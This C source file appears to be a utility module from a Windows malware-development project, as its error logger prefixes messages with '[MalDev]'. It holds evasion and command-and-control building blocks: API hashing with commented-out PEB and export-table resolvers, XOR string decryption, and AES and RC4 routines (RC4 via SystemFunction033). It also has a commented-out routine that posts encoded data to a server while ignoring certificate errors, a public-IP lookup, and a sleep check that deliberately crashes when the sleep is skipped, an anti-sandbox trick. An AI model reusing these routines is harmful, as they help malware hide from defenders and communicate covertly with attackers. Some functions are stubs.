#include "pch.h"

UINT32 HashStringRotr32SubA
(
	_In_ UINT32 uValue,
	_In_ UINT   uCount
)
{
	DWORD Mask = (CHAR_BIT * sizeof(uValue) - 1);
	uCount &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
	return (uValue >> uCount) | (uValue << ((-uCount) & Mask));
#pragma warning( pop ) 
}

DWORD HashStringRotr32A
(
	_In_ LPSTR s
)
{
	DWORD Value = 0;

	for (INT Index = 0; Index < strlen(s); Index++)
		Value = s[Index] + HashStringRotr32SubA(Value, SEED);

	return Value;
}

//HMODULE GetModuleHandleByHash
//(
//	_In_ LPSTR ModuleName
//)
//{
//	if (ModuleName == NULL)
//		return NULL;
//
//	PPEB pPeb = (PPEB)__readgsqword(0x60);
//	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
//	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);
//
//	while (pDte) {
//		if (pDte->FullDllName.Buffer != NULL) {
//			if (pDte->FullDllName.Length < MAX_PATH - 1) {
//				CHAR DllName[MAX_PATH] = { 0 };
//				DWORD i = 0;
//				while (pDte->FullDllName.Buffer[i] && i < sizeof(DllName) - 1) {
//					DllName[i] = (char)pDte->FullDllName.Buffer[i];
//					i++;
//				}
//
//				DllName[i] = '\0';
//				if (HASHA(DllName) == HASHA(ModuleName)) {
//					return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
//				}
//			}
//		}
//		else {
//			break;
//		}
//
//		pDte = (PLDR_DATA_TABLE_ENTRY)DEREF_64(pDte);
//	}
//	return NULL;
//}

UINT32 CopyDotStr
(
	_In_ PCHAR String
)
{
	for (UINT32 i = 0; i < strlen(String); i++)
	{
		if (String[i] == '.')
			return i;
	}

	return 0;
}

LPCWSTR DecryptStringW
(
	_In_ PBYTE pBuffer
)
{
	SHORT c;
	INT i = 0;

	while (TRUE) {
		c = *(PSHORT)&pBuffer[i];
		c ^= 0xD1A5;
		if (c == 0) {
			break;
		}

		*(PSHORT)&pBuffer[i] = c;
		i += sizeof(WCHAR);
	}

	return (LPCWSTR)pBuffer;
}

//LPVOID GetProcAddressByHash
//(
//	_In_ HMODULE hModule,
//	_In_ DWORD   dwHash
//)
//{
//	if (hModule == NULL || dwHash == 0)
//		return NULL;
//
//	HMODULE hModule2 = NULL;
//	UINT64	DllBaseAddress = (UINT64)hModule;
//
//	PIMAGE_NT_HEADERS NtHdr = (PIMAGE_NT_HEADERS)(DllBaseAddress + ((PIMAGE_DOS_HEADER)DllBaseAddress)->e_lfanew);
//	PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&NtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
//	PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)(DllBaseAddress + pDataDir->VirtualAddress);
//
//	UINT64 FunctionNameAddressArray = (DllBaseAddress + ExportTable->AddressOfNames);
//	UINT64 FunctionAddressArray = (DllBaseAddress + ExportTable->AddressOfFunctions);
//	UINT64 FunctionOrdinalAddressArray = (DllBaseAddress + ExportTable->AddressOfNameOrdinals);
//	UINT64 pFunctionAddress = 0;
//	// UINT64 wSignature = 0;
//
//	DWORD	dwCounter = ExportTable->NumberOfNames;
//
//	while (dwCounter--) {
//		char* FunctionName = (char*)(DllBaseAddress + DEREF_32(FunctionNameAddressArray));
//
//		if (HASHA(FunctionName) == dwHash) {
//			FunctionAddressArray += (DEREF_16(FunctionOrdinalAddressArray) * sizeof(DWORD));
//			pFunctionAddress = (UINT64)(DllBaseAddress + DEREF_32(FunctionAddressArray));
//
//			if (pDataDir->VirtualAddress <= DEREF_32(FunctionAddressArray) && (pDataDir->VirtualAddress + pDataDir->Size) >= DEREF_32(FunctionAddressArray)) {
//				CHAR Library[MAX_PATH] = { 0 };
//				CHAR Function[MAX_PATH] = { 0 };
//				UINT32 Index = CopyDotStr((PCHAR)pFunctionAddress);
//				if (Index == 0) {
//					return NULL;
//				}
//
//				memcpy((PVOID)Library, (PVOID)pFunctionAddress, Index);
//				memcpy((PVOID)Function, (PVOID)((ULONG_PTR)pFunctionAddress + Index + 1), strlen((LPCSTR)((ULONG_PTR)pFunctionAddress + Index + 1)));
//				if ((hModule2 = LoadLibraryA(Library)) != NULL) {
//					pFunctionAddress = (UINT64)GetProcAddressByHash(hModule2, HASHA(Function));
//				}
//			}
//			break;
//		}
//
//		FunctionNameAddressArray += sizeof(DWORD);
//		FunctionOrdinalAddressArray += sizeof(WORD);
//	}
//
//	return (LPVOID)(pFunctionAddress);
//}

UINT64 ReadQword
(
	_In_ LPVOID lpAddr
)
{
	BYTE Buffer[sizeof(UINT64)];
	UINT64 uResult = 0;
	DWORD i;
	UINT64 dwTemp;

	if (memcpy(Buffer, lpAddr, sizeof(Buffer))) {
		for (i = 0; i < _countof(Buffer); i++) {
			dwTemp = Buffer[i];
			uResult += (dwTemp << (i * 8));
		}
	}

	return uResult;
}

LPSTR* ReadEachLineA
(
	_In_  LPSTR  lpBuffer,
	_Out_ PDWORD pdwCount
)
{
	DWORD dwIdx = 0;
	DWORD dwIdxStart = 0;
	DWORD dwLength;
	CHAR szTemp[0x100];
	LPSTR* lpResult;
	DWORD dwCount = 0;

	lpResult = (LPSTR*)ALLOC(sizeof(LPSTR));

	while (lpBuffer[dwIdx] != '\0') {
		if (lpBuffer[dwIdx] == '\n') {
			dwLength = dwIdx - dwIdxStart;
			lpResult[dwCount] = (LPSTR)ALLOC(dwLength + 1);
			memcpy(lpResult[dwCount], &lpBuffer[dwIdxStart], dwLength);
			dwCount += 1;
			lpResult = (LPSTR*)REALLOC(lpResult, (dwCount + 1) * sizeof(LPSTR));
			dwIdxStart = dwIdx + 1;
		}

		dwIdx++;
	}

	*pdwCount = dwCount;
	return lpResult;
}

DWORD StrHash
(
	_In_ LPSTR s
)
{
	DWORD dwHashVal = 0;
	DWORD dwTemp = 0;

	for (DWORD i = 0; i < strlen(s); i++) {
		dwHashVal = (dwHashVal << 4) + s[i];
		dwTemp = dwHashVal & 0xF0000000L;
		if (dwTemp != 0)
			dwHashVal ^= dwTemp >> 24;

		dwHashVal &= ~dwTemp;
	}

	return dwHashVal;
}

//LPSTR GetPublicIp
//(
//	_In_ HINTERNET hInternet
//)
//{
//	HANDLE hConnect = NULL;
//	HANDLE hRequest = NULL;
//	LPSTR lpResp = NULL;
//	DWORD dwRespSize = 0;
//
//	hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
//	hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
//
//	lpResp = SendRequestGetResponse(hRequest, &dwRespSize);
//
//	if (hRequest) {
//		InternetCloseHandle(hInternet);
//	}
//
//	if (hConnect) {
//		InternetCloseHandle(hConnect);
//	}
//
//	return lpResp;
//}

LPSTR Encode
(
	_In_ LPSTR lpKey,
	_In_ LPSTR lpPlainText
)
{
	LPSTR lpCipher = NULL;
	CHAR c;
	DWORD dwPlaceholder;

	lpCipher = ALLOC(strlen(lpPlainText) + 1);
	for (DWORD i = 0; i < strlen(lpPlainText); i++) {
		c = lpKey[i % strlen(lpKey)];
		dwPlaceholder = (DWORD)(lpPlainText[i]) + (DWORD)(c);
		lpCipher[i] = (UCHAR)(dwPlaceholder % 127);
	}

	return lpCipher;
}

//LPSTR SendEncodedString
//(
//	_In_  PSTRINGS pStrings,
//	_In_  LPSTR    lpKey,
//	_In_  LPSTR    lpData,
//	_In_  LPSTR    lpEndpoint,
//	_In_  HANDLE   hConnect
//)
//{
//	LPSTR lpResult = NULL;
//	LPSTR lpBuffer = NULL;
//	LPSTR lpChunk = NULL;
//	HANDLE hRequest;
//	BOOL bReqSuccess;
//	DWORD dwReceivedData = 0;
//	DWORD dwChunkSize = 2048;
//	DWORD dwSize = 0;
//
//	lpResult = Encode(lpKey, lpData);
//	hRequest = HttpOpenRequestA(hConnect, pStrings->lpPost, lpEndpoint, NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
//	bReqSuccess = HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)lpResult, strlen(lpResult));
//	lpResult = NULL;
//
//	if (bReqSuccess) {
//		lpChunk = ALLOC(dwChunkSize);
//		lpBuffer = ALLOC(dwChunkSize);
//		while (InternetReadFile(hRequest, lpChunk, dwChunkSize, &dwReceivedData) && dwReceivedData)
//		{
//			lpBuffer = REALLOC(lpBuffer, dwSize + dwReceivedData);
//			memcpy(&lpBuffer[dwSize], lpChunk, dwReceivedData);
//			dwSize += dwReceivedData;
//		}
//
//		HttpEndRequestA(hRequest, NULL, NULL, NULL);
//		InternetCloseHandle(hRequest);
//		lpResult = Decode(lpKey, lpBuffer);
//	}
//
//	if (lpChunk != NULL) {
//		FREE(lpChunk);
//	}
//
//	if (lpBuffer != NULL) {
//		FREE(lpChunk);
//	}
//
//	HttpEndRequestA(hRequest, NULL, NULL, NULL);
//	InternetCloseHandle(hRequest);
//	return lpResult;
//}

BOOL DirectoryExists
(
	_In_ LPSTR szPath
)
{
	DWORD dwAttrib = GetFileAttributesA(szPath);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsFileExists
(
	_In_ LPWSTR wszPath
)
{
	DWORD dwAttrib = GetFileAttributesW(wszPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsPathExists
(
	_In_ LPSTR lpPath
)
{
	DWORD dwAttrib = GetFileAttributesA(lpPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES);
}

VOID Decrypt
(
	_In_ PBYTE pBuffer,
	_In_ DWORD dwSize,
	_In_ LPSTR lpKey
)
{
	/*UCHAR c;
	DWORD i;

	for (i = 0; i < dwSize; i++) {
		pBuffer[i] ^= lpKey[i % strlen(lpKey)];
	}*/
	return;
}

LPSTR ConvertToChar
(
	_In_  LPWSTR wszInput
)
{
	DWORD dwSize = 0;
	LPSTR lpResult = NULL;

	dwSize = WideCharToMultiByte(CP_UTF8, 0, wszInput, wcslen(wszInput), NULL, 0, NULL, NULL);
	lpResult = ALLOC(dwSize + 1);
	dwSize = WideCharToMultiByte(CP_UTF8, 0, wszInput, wcslen(wszInput), lpResult, dwSize, NULL, NULL);

	return lpResult;
}

LPWSTR ConvertToWChar
(
	_In_ LPSTR szInput
)
{
	DWORD dwSize = 0;
	LPWSTR lpResult = NULL;

	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, strlen(szInput), NULL, 0);
	lpResult = ALLOC((dwSize + 1) * sizeof(WCHAR));
	dwSize = MultiByteToWideChar(CP_UTF8, 0, szInput, strlen(szInput), lpResult, dwSize);
	return lpResult;
}

VOID CustomSleep
(
	_In_ DWORD dwMilliseconds
)
{
	FILETIME Start, End;
	UINT64 uStart, uEnd;
	uStart = uEnd = 0;
	FLOAT Exception;

	GetSystemTimeAsFileTime(&Start);
	//uStart = ((UINT64)(Start.dwHighDateTime) << 32) | Start.dwLowDateTime;
	uStart = *(PUINT64)(&Start);
	Sleep(dwMilliseconds);
	GetSystemTimeAsFileTime(&End);
	uEnd = *(PUINT64)(&End);

	if (uEnd - uStart < 100000000) {
		Exception = (DOUBLE)1 / (uEnd - uEnd);
	}
}

PBYTE XorString
(
	_In_ LPSTR lpStr,
	_In_ DWORD dwSize,
	_In_ DWORD dwKey
)
{
	DWORD i = 0;
	DWORD j = 0;
	UINT8 c;
	PBYTE pResult = NULL;

	pResult = ALLOC(dwSize + 1);

	for (i = 0; i < dwSize; i++) {
		c = lpStr[i];
		for (j = 0; j < 32; j += 8) {
			c = c ^ ((dwKey >> j) & 0xFF);
		}

		dwKey += 1;
		pResult[i] = c;
	}

	return pResult;
}

BOOL EncryptData
(
	_In_  PBYTE  pPlaintext,
	_In_  DWORD  dwPlainSize,
	_Out_ PBYTE * pCipher,
	_Out_ PDWORD pdwCipherSize,
	_In_  PBYTE  pKey
)
{
	BCRYPT_ALG_HANDLE AlgHandle = NULL;
	NTSTATUS status = 0;
	BOOL bResult = FALSE;
	ULONG uNumberOfBytesRead = 0;
	PBYTE pIv = NULL;
	PBYTE pKeyObj = NULL;
	DWORD dwKeyObjSize = 0;
	DWORD dwBlockLength = 0;
	BCRYPT_KEY_HANDLE hKey = NULL;
	PBYTE pCipherText = NULL;
	DWORD dwCipherText = 0;
	PBYTE pResult = NULL;
	DWORD dwResultSize = 0;
	PBYTE pTempIv = NULL;

	pTempIv = ALLOC(16);
	pIv = GenRandomBytes(16);
	if (!pIv) {
		goto CLEANUP;
	}

	memcpy(pTempIv, pIv, 16);
	status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGetProperty(AlgHandle, BCRYPT_OBJECT_LENGTH, &dwKeyObjSize, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pKeyObj = ALLOC(dwKeyObjSize);
	status = BCryptGetProperty(AlgHandle, BCRYPT_BLOCK_LENGTH, &dwBlockLength, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	if (dwBlockLength > 16) {
		goto CLEANUP;
	}

	status = BCryptSetProperty(AlgHandle, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGenerateSymmetricKey(AlgHandle, &hKey, pKeyObj, dwKeyObjSize, pKey, 16, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptEncrypt(hKey, pPlaintext, dwPlainSize, NULL, pIv, dwBlockLength, NULL, 0, &dwCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pCipherText = ALLOC(dwCipherText);
	status = BCryptEncrypt(hKey, pPlaintext, dwPlainSize, NULL, pIv, dwBlockLength, pCipherText, dwCipherText, &dwCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	dwResultSize = dwBlockLength + dwCipherText;
	pResult = ALLOC(dwResultSize);
	memcpy(pResult, pTempIv, dwBlockLength);
	memcpy(&pResult[dwBlockLength], pCipherText, dwCipherText);

	*pCipher = pResult;
	*pdwCipherSize = dwResultSize;
	bResult = TRUE;
CLEANUP:
	if (AlgHandle != NULL) {
		BCryptCloseAlgorithmProvider(AlgHandle, 0);
	}

	if (hKey != NULL) {
		BCryptDestroyKey(hKey);
	}

	if (pIv != NULL) {
		FREE(pIv);
	}

	if (pCipherText != NULL) {
		FREE(pCipherText);
	}

	if (pKeyObj != NULL) {
		FREE(pKeyObj);
	}

	return bResult;
}

BOOL DecryptData
(
	_In_  PBYTE  pInput,
	_In_  DWORD  dwInputSize,
	_Out_ PBYTE * pOutput,
	_Out_ PDWORD pdwOutputSize,
	_In_  PBYTE  pKey
)
{
	BCRYPT_ALG_HANDLE AlgHandle = NULL;
	NTSTATUS status = 0;
	BOOL bResult = FALSE;
	ULONG uNumberOfBytesRead = 0;
	PBYTE pIv = NULL;
	DWORD dwBlockLength = 0;
	BCRYPT_KEY_HANDLE hKey = NULL;
	PBYTE pCipherText = NULL;
	DWORD dwCipherTextSize = 0;
	PBYTE pPlainText = NULL;
	DWORD dwPlainTextSize = 0;

	status = BCryptOpenAlgorithmProvider(&AlgHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGetProperty(AlgHandle, BCRYPT_BLOCK_LENGTH, &dwBlockLength, sizeof(DWORD), &uNumberOfBytesRead, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	if (dwBlockLength > 16) {
		goto CLEANUP;
	}

	pIv = ALLOC(dwBlockLength);
	memcpy(pIv, pInput, dwBlockLength);
	dwCipherTextSize = dwInputSize - dwBlockLength;
	pCipherText = ALLOC(dwCipherTextSize);
	memcpy(pCipherText, &pInput[dwBlockLength], dwCipherTextSize);

	status = BCryptSetProperty(AlgHandle, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptGenerateSymmetricKey(AlgHandle, &hKey, NULL, 0, pKey, 16, 0);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	status = BCryptDecrypt(hKey, pCipherText, dwCipherTextSize, NULL, pIv, dwBlockLength, NULL, 0, &dwPlainTextSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	pPlainText = ALLOC(dwPlainTextSize);
	memcpy(pIv, pInput, dwBlockLength);
	status = BCryptDecrypt(hKey, pCipherText, dwCipherTextSize, NULL, pIv, dwBlockLength, pPlainText, dwPlainTextSize, &dwPlainTextSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	*pOutput = pPlainText;
	*pdwOutputSize = dwPlainTextSize;
	bResult = TRUE;
CLEANUP:
	if (AlgHandle != NULL) {
		BCryptCloseAlgorithmProvider(AlgHandle, 0);
	}

	if (hKey != NULL) {
		BCryptDestroyKey(hKey);
	}

	if (pIv != NULL) {
		FREE(pIv);
	}

	if (pCipherText != NULL) {
		FREE(pCipherText);
	}

	return bResult;
}

DWORD Pow
(
	_In_ DWORD dwX,
	_In_ DWORD dwY
)
{
	DWORD i;
	DWORD dwResult = 1;

	for (i = 0; i < dwY; i++) {
		dwResult *= dwX;
	}

	return dwResult;
}

VOID Rc4EncryptDecrypt
(
	_In_  PBYTE  pbBuffer,
	_In_  DWORD  dwSize,
	_In_  PBYTE  pbKey,
	_In_  DWORD  dwKeySize
)
{
	struct ustring {
		DWORD Length;
		DWORD MaximumLength;
		PVOID Buffer;
	};

	struct ustring Key = { 0 };
	struct ustring PlainText = { 0 };
	NTSTATUS Status = 0;

	typedef NTSTATUS(WINAPI* _SystemFunction033)(struct ustring* memoryRegion, struct ustring* keyPointer);
	// fwprintf_s(f_log, L"Rc4EncryptDecrypt\n");
	_SystemFunction033 SystemFunction033 = GetProcAddress(LoadLibraryW(L"advapi32.dll"), "SystemFunction033");
	ZeroMemory(&Key, sizeof(struct ustring));
	ZeroMemory(&PlainText, sizeof(struct ustring));
	PlainText.Buffer = (PVOID)pbBuffer;
	PlainText.Length = dwSize;

	Key.Buffer = (PVOID)pbKey;
	Key.Length = dwKeySize;

	Status = SystemFunction033(&PlainText, &Key);
}

BOOL StartWith
(
	_In_ LPSTR lpSrc,
	_In_ LPSTR lpPattern
)
{
	CHAR c;
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (strlen(lpSrc) < strlen(lpPattern)) {
		return FALSE;
	}

	c = lpSrc[strlen(lpPattern)];
	lpSrc[strlen(lpPattern)] = '\0';
	dwCmpResult = strcmp(lpSrc, lpPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	lpSrc[strlen(lpPattern)] = c;
	return bResult;
}

BOOL EndWithA
(
	_In_ LPSTR lpSrc,
	_In_ LPSTR lpPattern
)
{
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (strlen(lpSrc) < strlen(lpPattern)) {
		return FALSE;
	}

	dwCmpResult = strcmp(&lpSrc[strlen(lpSrc) - strlen(lpPattern)], lpPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	return bResult;
}

BOOL EndWithW
(
	_In_ LPWSTR wszSrc,
	_In_ LPWSTR wszPattern
)
{
	DWORD dwCmpResult = 0;
	BOOL bResult = FALSE;

	if (wcslen(wszSrc) < wcslen(wszPattern)) {
		return FALSE;
	}

	dwCmpResult = wcscmp(&wszSrc[wcslen(wszSrc) - wcslen(wszPattern)], wszPattern);
	if (dwCmpResult == 0) {
		bResult = TRUE;
	}

	return bResult;
}

VOID CustomExit() {
	DWORD dwTemp = 10;
	DWORD dwResult = 0;

	dwResult = 1 / (dwTemp - 10);
}

BOOL IsUserAdmin()
{
	BOOL bIsAdmin = FALSE;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup = NULL;

	bIsAdmin = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
	if (bIsAdmin) {
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &bIsAdmin)) {
			bIsAdmin = FALSE;
		}

		FreeSid(AdministratorsGroup);
	}

	return bIsAdmin;
}

VOID HexDump
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
)
{
	DWORD i, j;
	for (i = 0; i < cbBuffer; i += 16) {
		printf("%08zx  ", i);

		for (j = 0; j < 16; j++) {
			if (i + j < cbBuffer) {
				printf("%02x ", pBuffer[i + j]);
			}
			else {
				printf("   ");
			}
		}

		printf(" |");
		for (j = 0; j < 16; j++) {
			if (i + j < cbBuffer) {
				printf("%c", isprint(pBuffer[i + j]) ? pBuffer[i + j] : '.');
			}
			else {
				printf(" ");
			}
		}

		printf("|\n");
	}
}

VOID LogError
(
	_In_ LPWSTR lpFormat,
	...
)
{
	va_list Args;
	WCHAR wszBuffer[0x600];

	RtlSecureZeroMemory(wszBuffer, sizeof(wszBuffer));
	lstrcpyW(wszBuffer, L"[MalDev] ");
	va_start(Args, lpFormat);
	vswprintf_s(wszBuffer + lstrlenW(wszBuffer), _countof(wszBuffer) - lstrlenW(wszBuffer), lpFormat, Args);
	wprintf(L"%lls", wszBuffer);
	va_end(Args);

	RaiseException(EXCEPTION_BREAKPOINT, EXCEPTION_NONCONTINUABLE, 0, NULL);
}

VOID LogErrorA
(
	_In_ LPSTR lpFormat,
	...
)
{
	va_list Args;
	CHAR szBuffer[0x600];

	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	lstrcpyA(szBuffer, "[MalDev] ");
	va_start(Args, lpFormat);
	vsprintf_s(szBuffer + lstrlenA(szBuffer), _countof(szBuffer) - lstrlenA(szBuffer), lpFormat, Args);
	OutputDebugStringA(szBuffer);
	va_end(Args);

	RaiseException(EXCEPTION_BREAKPOINT, EXCEPTION_NONCONTINUABLE, 0, NULL);
}

PBYTE CompressBuffer
(
	_In_ PBYTE pInput,
	_In_ DWORD cbInput,
	_Out_ PDWORD pcbOutput
)
{
	/*PBYTE pResult = NULL;
	COMPRESSOR_HANDLE hCompressor = 0;

	if (!CreateCompressor(COMPRESS_ALGORITHM_LZMS, )) {
		LogError(L"CreateCompressor failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

CLEANUP:
	return pResult;*/
}

VOID PrintStackTrace
(
	_In_ PCONTEXT pContext
)
{
	STACKFRAME64 StackFrame;
	HANDLE hCurrentProcess = NULL;
	PSYMBOL_INFO pSymbolInfo;
	DWORD i = 0;
	DWORD64 dwDisplacement = 0;
	IMAGEHLP_LINE64 Line;
	HMODULE hModule = NULL;
	CHAR szModulePath[0x400];

	hCurrentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SymInitialize(hCurrentProcess, NULL, TRUE);
	SecureZeroMemory(&StackFrame, sizeof(StackFrame));
	pSymbolInfo = ALLOC(sizeof(SYMBOL_INFO) + MAX_SYM_NAME);
	while (TRUE) {
		if (!StackWalk64(IMAGE_FILE_MACHINE_AMD64, hCurrentProcess, GetCurrentThread(), &StackFrame, pContext, NULL, SymFunctionTableAccess64, SymGetModuleBase64, NULL)) {
			break;
		}

		SecureZeroMemory(pSymbolInfo, sizeof(SYMBOL_INFO) + MAX_SYM_NAME);
		pSymbolInfo->SizeOfStruct = sizeof(SYMBOL_INFO);
		pSymbolInfo->MaxNameLen = MAX_SYM_NAME;
		if (!SymFromAddr(hCurrentProcess, StackFrame.AddrPC.Offset, &dwDisplacement, pSymbolInfo)) {
			break;
		}

		SecureZeroMemory(&Line, sizeof(Line));
		Line.SizeOfStruct = sizeof(Line);
		if (SymGetLineFromAddr64(hCurrentProcess, StackFrame.AddrPC.Offset, &dwDisplacement, &Line))
		{
			printf("\tat %s in %s: line: %lu: address: 0x%08llX\n", pSymbolInfo->Name, Line.FileName, Line.LineNumber, StackFrame.AddrPC.Offset);
		}
		else {
			printf("\tat %s, address 0x%08llX.\n", pSymbolInfo->Name, StackFrame.AddrPC.Offset);
			hModule = NULL;
			SecureZeroMemory(szModulePath, sizeof(szModulePath));
			GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPSTR)(StackFrame.AddrPC.Offset), &hModule);
			if (hModule != NULL) {
				GetModuleFileNameA(hModule, szModulePath, _countof(szModulePath));
			}

			printf("in %s\n", szModulePath);
		}

		if (!lstrcmpA(pSymbolInfo->Name, "main")) {
			if (hCurrentProcess != NULL) {
				CloseHandle(hCurrentProcess);
			}

			break;
		}
	}

	if (hCurrentProcess != NULL) {
		CloseHandle(hCurrentProcess);
	}

	if (pSymbolInfo != NULL) {
		FREE(pSymbolInfo);
	}

	return;
}

LPSTR CreateFormattedErr
(
	_In_ DWORD dwErrCode,
	_In_ LPSTR lpFormat,
	...
)
{
	va_list Args;
	LPSTR lpResult = NULL;
	LPSTR lpFormattedErr = NULL;

	lpResult = ALLOC(0x1000);
	va_start(Args, lpFormat);
	vsprintf(lpResult, lpFormat, Args);
	va_end(Args);

	lpFormattedErr = FormatErrorCode(dwErrCode);
	lpFormattedErr[lstrlenA(lpFormattedErr) - 3] = '\0';
	sprintf(&lpResult[lstrlenA(lpResult)], " (0x%08x: %s)", dwErrCode, lpFormattedErr);
	FREE(lpFormattedErr);
	lpResult = REALLOC(lpResult, lstrlenA(lpResult) + 1);
	return lpResult;
}

LPSTR FormatErrorCode
(
	_In_ DWORD dwErrorCode
)
{
	LPSTR lpResult = NULL;
	LPSTR lpTemp = NULL;
	DWORD cchOutput = 0;

	cchOutput = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, dwErrorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), &lpTemp, 0, NULL);
	if (cchOutput == 0) {
		return NULL;
	}

	lpResult = DuplicateStrA(lpTemp, 0);
	LocalFree(lpTemp);

	return lpResult;
}